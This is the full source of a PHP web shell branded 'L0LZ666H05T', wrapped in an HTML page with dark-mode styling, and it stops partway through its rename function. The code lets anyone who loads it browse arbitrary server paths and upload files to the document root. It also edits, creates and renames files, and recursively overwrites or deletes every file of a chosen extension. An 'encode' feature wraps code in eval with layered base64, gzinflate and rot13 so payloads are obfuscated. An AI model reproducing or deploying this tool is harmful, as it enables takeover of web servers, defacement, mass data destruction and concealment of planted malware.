<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="https://img.icons8.com/ios/500/ghost.png" sizes="32x32">
<title>L0LZ666H05T</title>
</head>
<style type="text/css">
@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
body {
  font-family: 'Ubuntu Mono', monospace;
  color: #8a8a8a;
  background:rgba(222,222,222,0.73);
}

table {
  background:#fff;
  line-height: 40px;
  border-collapse: separate;
  border-spacing: 0;
  border: 25px solid #fff;
  width: 70%;
  margin: 50px auto;
  border-radius: 20px;
  box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
}

thead tr:first-child {
  background: #fff;
  color: #8a8a8a;
  border: none;
}

th:first-child,
td:first-child {
  padding: 0 15px 0 20px;
}

th {
  font-weight: 500;
}

thead tr:last-child th {
  border-bottom: none;
}

tr.hover:hover {
  background-color: #dedede;
  cursor: default;
}
tbody tr:last-child td {
  border: none;
}


tbody td {
  border-bottom:none;
}

td:last-child {
  padding-right: 10px;
}
textarea {
  font-family: 'Ubuntu Mono', monospace;
  background:rgba(222,222,222,0.73);
  border:1px solid rgba(222,222,222,0.73);
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:-2px;
  width:96%;
  resize:none;
  border-radius:20px;
  height:400px;
  color:#8a8a8a;
  padding: 12px 20px;
  -moz-border-bottom-colors: none;
  -moz-border-left-colors: none;
  -moz-border-right-colors: none;
  -moz-border-top-colors: none;
  outline:none;
}
  ::-webkit-scrollbar {
  width: 0px;
  height: 0px;
}
  ::-webkit-scrollbar-button:start:decrement,
  ::-webkit-scrollbar-button:end:increment  {
  height: 0px;
  background-color: transparent;
}
  ::-webkit-scrollbar-track-piece  {
  background-color: #eeeeee;
}
  ::-webkit-scrollbar-thumb:vertical {
  height: 0px;
  background-color: #666;
  border: 0px solid #eee;
  -webkit-border-radius: 16px;
}

input[type=submit] {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 20px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  font-weight: bold;
  border-radius:20px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
}
input[type=text] {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  border-bottom:3px solid rgba(222,222,222,0.73);
  border-top:none;
  border-left:none;
  border-right:none;
}
select {
  font-family: 'Ubuntu Mono', monospace;
  padding:7px 5px;
  outline:none;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  color:#8a8a8a;
  border-bottom:3px solid rgba(222,222,222,0.73);
  border-top:none;
  border-left:none;
  border-right:none;
}
a {
  color: #8a8a8a;
  text-decoration:none;
}
a:hover {
  text-decoration: underline;
  -webkit-text-decoration-color: red;
  text-decoration-color: red;
}
.alert {
  text-align: center;
  width: 100%;
  margin-top:10px;
  margin-left:-10px;
  margin-bottom:10px;
  border: 1px solid transparent;
  border-radius: 20px;
}
.alert-success {
  background-color: #91cf91;
  border-color: #80c780;
  color: #3d8b3d;
}
.alert-danger {
  background-color: #e27c79;
  border-color: #dd6864;
  color: #9f2723;
}
textarea:focus,
th.line {
  border:1px solid #dedede;
}
.icon {
  width:25px;
  height:25px;
  margin-bottom:-6px;
  margin-left:-8px;
}
textarea:hover,  
a.tools:hover, 
a.back:hover,
select:hover, 
input[type=submit]:hover {
    cursor:pointer;
    border:1px solid red;
    text-decoration:none;
}
select:focus,
input:focus {
  background:rgba(222,222,222,0.73);
  border-left:none;
  border-right:none;
  border-top:none;
  border-bottom: 3px solid red;
}
select:hover, 
input[type=text]:hover {
  border-left:none;
  border-right:none;
  border-top:none;
  border-bottom:3px solid red;
}
table.back {
  background:none;
  border:none;
}
tr.back {
  background:none;
  border:none;
}
a.back {
  font-family: 'Ubuntu Mono', monospace;
  color:#8a8a8a;
  border-radius:20px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
  padding:5px 30px;
  outline:none;
  width:100%;
}
td.act {
  width:28px;
  background:#fff;
  border:1px solid #fff;
}
td.img {
  width:10px;
}
.container {
  display: block;
  position: relative;
  cursor: pointer;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
a.tools {
  font-family: 'Ubuntu Mono', monospace;
  margin-left:-8px;
  margin-right:10px;
  margin-top:10px;
  margin-bottom:10px;
  padding:7px 20px;
  outline:none;
  color:#8a8a8a;
  border-radius:20px;
  border:1px solid rgba(222,222,222,0.73);
  background:rgba(222,222,222,0.73);
}
@media screen 
  and (min-device-width: 1500px) 
  and (max-device-width: 1600px) 
  and (-webkit-min-device-pixel-ratio: 1) { 
}

/* ----------- Retina Screens ----------- */
@media screen 
  and (min-device-width: 1500px) 
  and (max-device-width: 1600px) 
  and (-webkit-min-device-pixel-ratio: 2)
  and (min-resolution: 192dpi) { 
}
/* Smartphones (portrait and landscape) ----------- */
@media only screen 
and (min-device-width : 320px) 
and (max-device-width : 480px) {
/* Styles */
}

/* Smartphones (landscape) ----------- */
@media only screen 
and (min-width : 321px) {
/* Styles */
}

/* Smartphones (portrait) ----------- */
@media only screen 
and (max-width : 320px) {
/* Styles */
}

/* iPads (portrait and landscape) ----------- */
@media only screen 
and (min-device-width : 768px) 
and (max-device-width : 1024px) {
/* Styles */
}

/* iPads (landscape) ----------- */
@media only screen 
and (min-device-width : 768px) 
and (max-device-width : 1024px) 
and (orientation : landscape) {
/* Styles */
}

/* iPads (portrait) ----------- */
@media only screen 
and (min-device-width : 768px) 
and (max-device-width : 1024px) 
and (orientation : portrait) {
/* Styles */
}

/* Desktops and laptops ----------- */
@media only screen 
and (min-width : 1224px) {
/* Styles */
}

/* Large screens ----------- */
@media only screen 
and (min-width : 1824px) {
/* Styles */
}

/* iPhone 4 ----------- */
@media
only screen and (-webkit-min-device-pixel-ratio : 1.5),
only screen and (min-device-pixel-ratio : 1.5) {
/* Styles */
}
input[type=checkbox]:not(old),
input[type=radio   ]:not(old){
  width     : 2em;
  margin    : 0;
  padding   : 0;
  font-size : 1em;
  opacity   : 0;
}
input[type=checkbox]:not(old) + label,
input[type=radio   ]:not(old) + label{
  display      : inline-block;
  margin-left  : -2em;
  line-height  : 1.5em;
}
input[type=checkbox]:not(old) + label > span,
input[type=radio   ]:not(old) + label > span{
  display          : inline-block;
  width            : 0.875em;
  height           : 0.875em;
  margin           : 0.25em 0.5em 0.25em 0.25em;
  border           : 0.0625em solid rgb(192,192,192);
  border-radius    : 0.25em;
  background       : rgb(224,224,224);
  background-image :    -moz-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image :     -ms-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image :      -o-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image : -webkit-linear-gradient(rgb(240,240,240),rgb(224,224,224));
  background-image :         linear-gradient(rgb(240,240,240),rgb(224,224,224));
  vertical-align   : bottom;
}
input[type=checkbox]:not(old):checked + label > span,
input[type=radio   ]:not(old):checked + label > span{
  background-image :    -moz-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image :     -ms-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image :      -o-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image : -webkit-linear-gradient(rgb(224,224,224),rgb(240,240,240));
  background-image :         linear-gradient(rgb(224,224,224),rgb(240,240,240));
}
input[type=checkbox]:not(old):checked + label > span:before{
  content     : '✓';
  display     : block;
  width       : 1em;
  color       : rgb(153,204,102);
  font-size   : 0.875em;
  line-height : 1em;
  text-align  : center;
  text-shadow : 0 0 0.0714em rgb(115,153,77);
  font-weight : bold;
}

input[type=radio]:not(old):checked + label > span > span{
  display          : block;
  width            : 0.5em;
  height           : 0.5em;
  margin           : 0.125em;
  border           : 0.0625em solid rgb(115,153,77);
  border-radius    : 0.125em;
  background       : rgb(153,204,102);
  background-image :    -moz-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image :     -ms-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image :      -o-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image : -webkit-linear-gradient(rgb(179,217,140),rgb(153,204,102));
  background-image :         linear-gradient(rgb(179,217,140),rgb(153,204,102));
}
</style>
<body>
<script type="text/javascript">
! function (e, t) {
  "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define("darkmode-js", [], t) : "object" == typeof exports ? exports["darkmode-js"] = t() : e["darkmode-js"] = t()
}("undefined" != typeof self ? self : this, function () {
  return function (e) {
    var t = {};

    function n(o) {
      if (t[o]) return t[o].exports;
      var r = t[o] = {
        i: o,
        l: !1,
        exports: {}
      };
      return e[o].call(r.exports, r, r.exports, n), r.l = !0, r.exports
    }
    return n.m = e, n.c = t, n.d = function (e, t, o) {
      n.o(e, t) || Object.defineProperty(e, t, {
        enumerable: !0,
        get: o
      })
    }, n.r = function (e) {
      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
        value: "Module"
      }), Object.defineProperty(e, "__esModule", {
        value: !0
      })
    }, n.t = function (e, t) {
      if (1 & t && (e = n(e)), 8 & t) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var o = Object.create(null);
      if (n.r(o), Object.defineProperty(o, "default", {
        enumerable: !0,
        value: e
      }), 2 & t && "string" != typeof e)
        for (var r in e) n.d(o, r, function (t) {
          return e[t]
        }.bind(null, r));
      return o
    }, n.n = function (e) {
      var t = e && e.__esModule ? function () {
        return e.default
      } : function () {
        return e
      };
      return n.d(t, "a", t), t
    }, n.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "", n(n.s = 0)
  }([
    function (e, t, n) {
      "use strict";
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.default = void 0;
      var o, r = (o = n(1)) && o.__esModule ? o : {
        default: o
      };
      var a = r.default;
      t.default = a,
      function (e) {
        e.Darkmode = r.default
      }(window), e.exports = t.default
    },
    function (e, t, n) {
      "use strict";

      function o(e, t) {
        for (var n = 0; n < t.length; n++) {
          var o = t[n];
          o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, o.key, o)
        }
      }
      Object.defineProperty(t, "__esModule", {
        value: !0
      }), t.default = void 0;
      var r = function () {
        function e(t) {
          ! function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
          }(this, e);
          var n = t && t.bottom ? t.bottom : "32px",
            o = t && t.right ? t.right : "32px",
            r = t && t.left ? t.left : "unset",
            a = t && t.time ? t.time : "0.3s",
            d = t && t.mixColor ? t.mixColor : "#fff",
            i = t && t.backgroundColor ? t.backgroundColor : "#fff",
            s = t && t.buttonColorDark ? t.buttonColorDark : "#100f2c",
            l = t && t.buttonColorLight ? t.buttonColorLight : "#fff",
            c = t && t.label ? t.label : "",
            u = !t || !1 !== t.saveInCookies,
            f = "\n      .darkmode-layer {\n        position: fixed;\n        pointer-events: none;\n        background: ".concat(d, ";\n        transition: all ").concat(a, " ease;\n        mix-blend-mode: difference;\n      }\n\n      .darkmode-layer--button {\n        width: 2.9rem;\n        height: 2.9rem;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n      }\n\n      .darkmode-layer--simple {\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n        transform: scale(1) !important;\n      }\n      \n      .darkmode-layer--expanded {\n        transform: scale(100);\n        border-radius: 0;\n      }\n\n      .darkmode-layer--no-transition {\n        transition: none;\n      }\n      \n      .darkmode-toggle {\n        background: ").concat(s, ";\n        width: 3rem;\n        height: 3rem;\n        position: fixed;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n        cursor: pointer;\n        transition: all 0.5s ease;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n      }\n      \n      .darkmode-toggle--white {\n        background: ").concat(l, ";\n      }\n\n      .darkmode-background {\n        background: ").concat(i, ";\n        position: fixed;\n        pointer-events: none;\n        z-index: -10;\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n      }\n      \n      img, .darkmode-ignore {\n        isolation: isolate;\n        display: inline-block;\n      }\n    "),
            m = document.createElement("div"),
            y = document.createElement("div"),
            b = document.createElement("div");
          y.innerHTML = c, m.classList.add("darkmode-layer"), b.classList.add("darkmode-background"), !0 === ("true" === window.localStorage.getItem("darkmode")) && u && (m.classList.add("darkmode-layer--expanded", "darkmode-layer--simple", "darkmode-layer--no-transition"), y.classList.add("darkmode-toggle--white"), document.body.classList.add("darkmode--activated")), document.body.insertBefore(y, document.body.firstChild), document.body.insertBefore(m, document.body.firstChild), document.body.insertBefore(b, document.body.firstChild), this.addStyle(f), this.button = y, this.layer = m, this.saveInCookies = u, this.time = a
        }
        var t, n, r;
        return t = e, (n = [{
          key: "addStyle",
          value: function (e) {
            var t = document.createElement("link");
            t.setAttribute("rel", "stylesheet"), t.setAttribute("type", "text/css"), t.setAttribute("href", "data:text/css;charset=UTF-8," + encodeURIComponent(e)), document.head.appendChild(t)
          }
        }, {
          key: "showWidget",
          value: function () {
            var e = this,
              t = this.button,
              n = this.layer,
              o = 1e3 * parseFloat(this.time);
            t.classList.add("darkmode-toggle"), n.classList.add("darkmode-layer--button"), t.addEventListener("click", function () {
              var r = e.isActivated();
              r ? (n.classList.remove("darkmode-layer--simple"), setTimeout(function () {
                n.classList.remove("darkmode-layer--no-transition"), n.classList.remove("darkmode-layer--expanded")
              }, 1)) : (n.classList.add("darkmode-layer--expanded"), setTimeout(function () {
                n.classList.add("darkmode-layer--no-transition"), n.classList.add("darkmode-layer--simple")
              }, o)), t.classList.toggle("darkmode-toggle--white"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !r)
            })
          }
        }, {
          key: "toggle",
          value: function () {
            var e = this.layer,
              t = this.isActivated();
            e.classList.toggle("darkmode-layer--simple"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !t)
          }
        }, {
          key: "isActivated",
          value: function () {
            return document.body.classList.contains("darkmode--activated")
          }
        }]) && o(t.prototype, n), r && o(t, r), e
      }();
      t.default = r, e.exports = t.default
    }
  ])
});
</script>
<script>
  new Darkmode().showWidget();
</script>
<table>
<?php
function cwd()
{
    if (isset($_GET['path'])) {
        $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
        @chdir($cwd);
    } else {
        $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
    }
    return $cwd;
}
function pwd()
{
    $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
    foreach ($dir as $key => $pwd) {
        print "<a href='?path=";
        for ($i = 0; $i <= $key; $i++) {
            print $dir[$i];
            if ($i != $key) {
                print DIRECTORY_SEPARATOR;
            }
        }
        print "'>" . $pwd . "</a>/";
    }
}
function perms($filename)
{
    $perms = fileperms($filename);

    switch ($perms & 0xf000) {
        case 0xc000: // socket
            $info = 's';
            break;
        case 0xa000: // symbolic link
            $info = 'l';
            break;
        case 0x8000: // regular
            $info = 'r';
            break;
        case 0x6000: // block special
            $info = 'b';
            break;
        case 0x4000: // directory
            $info = 'd';
            break;
        case 0x2000: // character special
            $info = 'c';
            break;
        case 0x1000: // FIFO pipe
            $info = 'p';
            break;
        default:
            // unknown
            $info = 'u';
    }

    // Owner
    $info .= $perms & 0x0100 ? 'r' : '-';
    $info .= $perms & 0x0080 ? 'w' : '-';
    $info .=
        $perms & 0x0040
            ? ($perms & 0x0800
                ? 's'
                : 'x')
            : ($perms & 0x0800
                ? 'S'
                : '-');

    // Group
    $info .= $perms & 0x0020 ? 'r' : '-';
    $info .= $perms & 0x0010 ? 'w' : '-';
    $info .=
        $perms & 0x0008
            ? ($perms & 0x0400
                ? 's'
                : 'x')
            : ($perms & 0x0400
                ? 'S'
                : '-');

    // World
    $info .= $perms & 0x0004 ? 'r' : '-';
    $info .= $perms & 0x0002 ? 'w' : '-';
    $info .=
        $perms & 0x0001
            ? ($perms & 0x0200
                ? 't'
                : 'x')
            : ($perms & 0x0200
                ? 'T'
                : '-');

    return $info;
}
function permission($filename, $perms)
{
    if (
        is_writable($filename)
    ) { ?> <font color="green"><?php print $perms; ?></font> <?php } else { ?> <font color="red"><?php print $perms; ?></font> <?php }
}
function size($file)
{
    $bytes = @filesize($file);
    if ($bytes >= 1073741824) {
        return @number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return @number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return @number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}
function success($text)
{
    ?>
  <center>
  <div class="alert alert-success" role="alert">
    <?php print $text; ?>
  </div>
  </center>
  <?php
}
function failed($text)
{
    ?>
  <center>
  <div class="alert alert-danger" role="alert">
    <?php print $text; ?>
  </div>
  </center>
  <?php
}
function makefile($filename, $text)
{
    $fp = @fopen($filename, "w");
    @fwrite($fp, $text);
    @fclose($fp);
}
function makedir($filename)
{
    return @mkdir($filename);
}
if (isset($_GET['encode'])) { ?>
    <thead>
      <tr>
        <th colspan="2">
          <a class="back" href="?path=<?php print @cwd(); ?>">ENCODE</a>
        </th>
      </tr>
    </thead>
    <form method="post">
    <tr>
      <td colspan="2">
        <textarea name="text"></textarea>
      </td>
    </tr>
    <tr>
      <td>
        <select name="mode" style="width:100%;">
          <option value="urlencode">url</option>
          <option value="base64">Base64</option>
          <option value="ur">base64 - convert_uu</option>
          <option value="gzinflates">gzinflate - base64</option>
          <option value="str2">str_rot13 - base64</option>
          <option value="gzinflate">str_rot13 - gzinflate - base64</option>
          <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
          <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
        </select>
      </td>
      <td>
        <input style="width:100%;" type="submit" name="submit" value="ENCODE">
      </td>
    </tr>
    </form>
    <?php
    if (isset($_POST['submit'])) {
        encode($_POST['text'], $_POST['mode']);
    }
    exit();
    }
function encode($text, $mode)
{
    switch ($mode) {
        case 'base64':
            $codi = base64_encode($text);
            $codi = "<?php eval('?>'.base64_decode('$codi'));";
            break;
        case 'str':
            $codi = base64_encode(str_rot13(gzdeflate(str_rot13($text))));
            $codi = "<?php eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
            break;
        case 'gzinflate':
            $codi = base64_encode(gzdeflate(str_rot13($text)));
            $codi = "<?php eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
            break;
        case 'gzinflates':
            $codi = base64_encode(gzdeflate($text));
            $codi = "<?php eval('?>'.gzinflate(base64_decode('$codi')));";
            break;
        case 'str2':
            $codi = base64_encode(str_rot13($text));
            $codi = "<?php eval('?>'.str_rot13(base64_decode('$codi')));";
            break;
        case 'urlencode':
            $codi = rawurlencode($text);
            $codi = "<?php eval('?>'.rawurldecode('$codi'));";
            break;
        case 'ur':
            $codi = base64_encode(convert_uuencode($text));
            $codi = "<?php eval('?>'.convert_uudecode(base64_decode('$codi')));";
            break;
        case 'url':
            $codi = base64_encode(
                gzdeflate(
                    convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))
                )
            );
            $codi = "<?php eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
            break;
    } ?>
  <tr>
    <td colspan="2">
      <textarea readonly><?= $codi ?></textarea>
    </td>
  </tr>
  <?php exit();
}
function masswriter($post)
{
    if ($_GET['do'] == 'masswrite') { ?>
  <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php print @cwd(); ?>">REPLACE FILE</a>
        </th>
      </tr>
    </thead>
  <form method="post">
    <tr>
      <td>
        <div align="center">
          <input id="option" type="radio" name="mode" value="masswrite" checked="checked">
          <label for="option"><span><span></span></span>masswrite</label>
          <input id="option" type="radio" name="mode" value="massdelete">
          <label for="option"><span><span></span></span>massdelete</label>
        </div>
      </td>
    </tr>
    <tr>
      <td>
        <input style="width:98.9%;" type="text" name="dir" value="<?php print @cwd(); ?>">
        
      </td>
    </tr>
    <tr>
      <td>
        <input style="width:98.9%;" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
      </td>
    </tr>
    <tr>
      <td>
        <textarea style="width:96.5%;" name="text" placeholder="if you choose mode massdelete please empty this"></textarea>
      </td>
    </tr>
    <tr>
      <td>
        <input class="btn btn-primary" style="width:100%" type="submit" name="submit" value="MASS">
      </td>
    </tr>
  </form>
  <?php
  if (isset($_POST['submit'])) {
      if ($_POST['mode'] == 'masswrite') {
          @masswrite($_POST['dir'], $_POST['type'], $_POST['text']);
      }
      if ($_POST['mode'] == 'massdelete') {
          @massdelete($_POST['dir'], $_POST['type']);
      }
  }
  exit();
  }
}
function masswrite($dir, $type, $text)
{
    if (is_writable($dir)) {
        $getfile = scandir($dir);
        foreach ($getfile as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            if ($file === '.' || filetype($path) == 'file') {
                if (
                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
                        0 &&
                    @preg_match(
                        "/" . $file . "$/",
                        $_SERVER['PHP_SELF'],
                        $matches
                    ) != 1
                ): ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?= $dir .
                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Rewrite Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php file_put_contents($path, $text);endif;
            } elseif ($file === '..' || filetype($path) == 'file') {
                if (
                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
                        0 &&
                    @preg_match(
                        "/" . $file . "$/",
                        $_SERVER['PHP_SELF'],
                        $matches
                    ) != 1
                ): ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?= $dir .
                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Rewrite Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php file_put_contents($path, $text);endif;
            } else {
                if (is_dir($path)) {
                    if (is_writable($path)) {
                        @file_put_contents($path, $text);
                        masswrite($path, $type, $text);
                    }
                }
            }
        }
    }
}
function massdelete($dir, $type)
{
    if (is_writable($dir)) {
        $getfile = scandir($dir);
        foreach ($getfile as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            if ($file === '.' || filetype($path) == 'file') {
                if (
                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
                        0 &&
                    @preg_match(
                        "/" . $file . "$/",
                        $_SERVER['PHP_SELF'],
                        $matches
                    ) != 1
                ): ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?= $dir .
                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Delete Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php unlink($path);endif;
            } elseif ($file === '..' || filetype($path) == 'file') {
                if (
                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
                        0 &&
                    @preg_match(
                        "/" . $file . "$/",
                        $_SERVER['PHP_SELF'],
                        $matches
                    ) != 1
                ): ?>
                    <tr>
                        <td>
                            <div class="alert alert-success">
                                <?= $dir .
                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Delete Successfully !</b>
                            </div>
                        </td>
                    </tr>
                    <?php unlink($path);endif;
            } else {
                if (is_dir($path)) {
                    if (is_writable($path)) {
                        @unlink($path);
                        massdelete($path, $type);
                    }
                }
            }
        }
    }
}
function making($post)
{
    if ($_GET['do'] == 'making') { ?>
    <thead>
      <tr>
        <th colspan="2">
          <a class="back" href="?path=<?php print @cwd(); ?>">MAKE FILE & DIRECTORY</a>
        </th>
      </tr>
    </thead>
    <?php if (isset($_POST['submit'])) {
        if ($_POST['type'] == 'file') {
            switch ($_POST['file_name']) {
                case 'txt':
                    $_mode = "txt";
                    break;
                case 'html':
                    $_mode = "html";
                    break;
                case 'php':
                    $_mode = "php";
                    break;
                case 'css':
                    $_mode = "css";
                    break;
                case 'asp':
                    $_mode = "asp";
                    break;
                case 'js':
                    $_mode = "js";
                    break;
                case 'python':
                    $_mode = "py";
                    break;
                case 'perl':
                    $_mode = "pl";
                    break;
            }
            if (
                @makefile($_POST['filename'] . "." . $_mode, $_POST['text'])
            ) { ?>
          <tr>
            <td colspan="2">
              <?php print @failed(
                  "Create File <b>" .
                      $_POST['filename'] .
                      "." .
                      $_mode .
                      "</b> Failed"
              ); ?>
            </td>
          </tr>
          <?php } else { ?>
          <tr>
            <td colspan="2">
              <?php print @success(
                  "Create File <b>" .
                      $_POST['filename'] .
                      "." .
                      $_mode .
                      "</b> Successfully"
              ); ?>
            </td>
          </tr>
          <?php }
        }
        if ($_POST['type'] == 'dir') {
            if (@makedir($_POST['filename'])) { ?>
          <tr>
            <td>
              <?php print @success(
                  "Create DIRECTORY " . $_POST['filename'] . " Successfully"
              ); ?>
              <?php print sleep(7); ?>
              <?php print flush(); ?>
              <?php print @header(
                  "Location : ?path=" .
                      @cwd() .
                      DIRECTORY_SEPARATOR .
                      $_POST['filename'] .
                      ""
              ); ?>
            </td>
          </tr>
          <?php } else { ?>
          <tr>
            <td>
              <?php print @failed(
                  "Create DIRECTORY " . $_POST['filename'] . " Failed"
              ); ?>
            </td>
          </tr>
          <?php }
        }
    } ?>
    <form method="post">
      <tr>
        <td colspan="2">
          <select style="width:100%;" name="type">
            <option value="file">FILE</option>
            <option value="dir">DIRECTORY</option>
          </select>
        </td>
      </tr>
      <tr>
        <td style="width:50px;">
          <select name="file_name">
            <option value="txt">txt</option>
            <option value="html">html</option>
            <option value="php">php</option>
            <option value="css">css</option>
            <option value="asp">asp</option>
            <option value="js">js</option>
            <option value="python">python</option>
            <option value="perl">pl</option>
          </select>
        </td>
        <td>
          <center>
          <input style="width:98.8%;" type="text" name="filename" placeholder="Filename: ">
        </center>
        </td>
      </tr>
      <tr>
        <td colspan="2">
          <textarea name="text" placeholder="sfx* please empty this textarea if you want create DIRECTORY"></textarea>
        </td>
      </tr>
      <tr>
        <td colspan="2">
          <input style="width:100%;" type="submit" name="submit">
        </td>
      </tr>
    </form>
    <?php exit();}
}
function upload($post)
{
    if ($_GET['do'] == $post) {
        if (isset($_POST['submit'])) {
            if ($_POST['type'] == 'biasa') {
                if (
                    @copy(
                        $_FILES['file']['tmp_name'],
                        @cwd() . DIRECTORY_SEPARATOR . $_FILES['file']['name']
                    )
                ) { ?>
          <tr>
            <td>
              <?php print @success("Upload Success"); ?>
            </td>
          </tr>
          <?php } else { ?>
          <tr>
            <td>
              <?php print @failed("Upload Failed"); ?>
            </td>
          </tr>
          <?php }
            }
            if ($_POST['type'] == 'root') {
                $root = $_SERVER['DOCUMENT_ROOT'];
                if (
                    @copy(
                        $_FILES['file']['tmp_name'],
                        $root . DIRECTORY_SEPARATOR . $_FILES['file']['name']
                    )
                ) { ?>
          <tr>
            <td>
              <?php print @success("Upload Success"); ?>
            </td>
          </tr>
          <?php } else { ?>
          <tr>
            <td>
              <?php print @failed("Upload Failed"); ?>
            </td>
          </tr>
          <?php }
            }
        } ?>
    <thead>
        <tr>
          <th>
            <a class="back" href="?path=<?php print @cwd(); ?>">UPLOAD FILE</a>
          </th>
        </tr>
      </thead>
    <form method="post" enctype="multipart/form-data">
      <tr>
        <td>
          <div align="center">
            <input id="option" type="radio" name="type" value="biasa" checked="checked">
            <label for="option"><span><span></span></span>biasa
            ( <?php print @permission(@cwd(), "Writable"); ?> )
            </label>
            <input id="option" type="radio" name="type" value="root">
            <label for="option"><span><span></span></span>home_root
            ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable"); ?>
            </label>
        </div>
        </td>
      </tr>
      <tr>
        <td>
          <center>
          <input type="file" name="file">
          <input style="width:100px;" type="submit" name="submit" value="Upload">
          </center>
        </td>
      </tr>
    </form>
    <?php exit();
    }
}
function edit($post, $filename)
{
    if ($_GET['do'] == $post) {

        if (isset($_POST['submit'])) {
            $fp = @fopen($filename, "w");
            if (@fwrite($fp, $_POST['text'])) { ?>
        <tr>
            <td>
                <?php print @success("Saved"); ?>
            </td>
        </tr>
        <?php } else { ?>
        <tr>
            <td>
                <?php print @failed("Failed"); ?>
            </td>
        </tr>
        <?php }
        }
        $text = @htmlspecialchars(@file_get_contents($filename));
        ?>
    <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php print @cwd(); ?>">EDIT</a>
        </th>
      </tr>
      <tr>
        <th>Filename : <?php print @permission(
            $filename,
            @basename($filename)
        ); ?></th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <textarea name="text"><?php print $text; ?></textarea>
        </td>
      </tr>
      <tr>
        <td>
          <input style="width:100%;" type="submit" name="submit" value="SAVE">
        </td>
      </tr>
    </form>
    <?php exit();
    }
}
function renames($post, $filename)
{
    if ($_GET['do'] == $post) {
        if (isset($_POST['submit'])) {
            if (@rename($filename, $_POST['newname'])) { ?>
        <tr>
            <td>
                <?php print @success("Rename Success"); ?>
            </td>
        </tr>
        <?php } else { ?>
        <tr>
            <td>
                <?php print @failed("Rename Failed"); ?>
            </td>
        </tr>
        <?php }
        } ?>
    <thead>
      <tr>
        <th>
          <a class="back" href="?path=<?php print @cwd(); ?>">RENAME</a>
        </th>
      </tr>
    </thead>
    <form method="post">
      <tr>
        <td>
          <input style="width:98.6%;" type="text" name="newname" value="<?php print @basename(
              $filename
          ); ?>">
        </td>
      </tr>
      <tr>
        <td>
